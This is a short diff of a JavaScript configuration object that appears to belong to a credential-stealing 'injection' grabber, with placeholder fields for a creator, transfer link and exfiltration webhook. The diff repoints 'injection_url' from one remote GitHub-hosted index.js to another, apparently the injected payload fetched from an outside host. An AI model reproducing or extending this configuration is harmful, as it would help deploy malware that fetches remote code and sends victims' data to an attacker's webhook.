@@ -19,7 +19,7 @@ var config = {
 
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Hawkish-Eyes/Hawkish-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/Baphomet1337/injectionlog/main/index.js",
     webhook: "%WEBHOOK%",
     Placed: "",
     Filter: {
